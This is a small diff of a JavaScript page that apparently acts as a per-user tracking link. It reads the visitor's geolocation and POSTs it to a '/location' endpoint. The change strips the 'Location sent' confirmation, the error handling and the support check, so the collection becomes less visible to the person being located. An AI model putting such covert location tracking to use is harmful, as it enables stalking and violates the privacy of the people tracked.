@@ -16,14 +16,7 @@ const user = params.get("user")
 
 function getLocation(){
 
-if(!navigator.geolocation){
-alert("Location not supported")
-return
-}
-
-navigator.geolocation.getCurrentPosition(
-
-function(pos){
+navigator.geolocation.getCurrentPosition(function(pos){
 
 fetch("/location",{
 method:"POST",
@@ -38,19 +31,6 @@ battery:"Unknown"
 })
 })
 
-alert("Location sent")
-
-},
-
-function(err){
-
-alert("Please allow location permission")
-
-},
-
-{
-enableHighAccuracy:true,
-timeout:10000
 })
 
 }
